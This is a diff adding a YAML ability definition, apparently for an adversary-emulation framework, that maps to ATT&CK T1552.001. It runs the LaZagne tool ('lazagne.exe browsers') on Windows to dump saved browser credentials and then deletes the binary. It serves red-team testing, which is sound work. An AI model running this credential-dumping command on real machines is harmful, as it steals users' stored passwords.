@@ -1,0 +1,20 @@
+---
+
+- id: a44445f7-934d-4ed2-9cf0-65cd82a70543
+  name: Credential Dumping with LaZagne
+  description: use https://github.com/AlessandroZ/LaZagne to extract credentials from browsers
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: "Unsecured Credentials: Credentials In Files"
+  platforms:
+    windows:
+      psh:
+        # We could want to execute all scripts with `lazagne.exe all` instead of only brower-related scripts
+        command: |
+          lazagne.exe browsers
+        payload:
+          lazagne.exe
+        cleanup: |
+          Remove-Item -Force lazagne.exe
+      
